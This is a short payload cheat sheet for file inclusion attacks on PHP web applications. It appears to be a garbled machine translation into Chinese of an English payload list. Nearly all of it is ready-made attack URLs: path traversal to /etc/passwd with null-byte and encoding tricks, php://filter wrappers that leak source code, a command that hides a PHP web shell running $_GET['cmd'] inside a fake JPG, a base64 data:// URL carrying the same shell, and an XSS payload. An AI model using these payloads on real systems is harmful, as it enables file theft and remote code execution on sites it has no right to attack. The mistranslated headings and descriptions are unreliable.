# 本地/远程文件夹
文件包含漏洞允许攻击者包括文件,通常利用在目标应用程序中实现的“动态文件包含”机制。

## 攻击
 
基本lfi ( null字节、双重编码和其他技巧)
```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```

lfi包装器rot13和base64 :/示例不区分大小写
```
http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=php=pHp://FilTer/convert.base64-encode/resource=index.php
```

lfi包装器zip
```python
os.system("echo \"</pre><?php system($_GET['cmd']); ?></pre>\" > payload.php; zip payload.zip payload.php; mv payload.zip shell.jpg; rm payload.php")
				
http://example.com/index.php?page=zip://shell.jpg%23payload.php
```


带有“< ?PHP系统(得到[ ' ' cmd ] ) ;回声完成了!”;?>有效载荷
```
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
```


通过RFI与“< < < SVG < > SVG =警报( 1 )>”有效负载
<svg onload=alert(1)>
```
http://example.com/index.php?page=data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+
```

## 感谢
* https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion
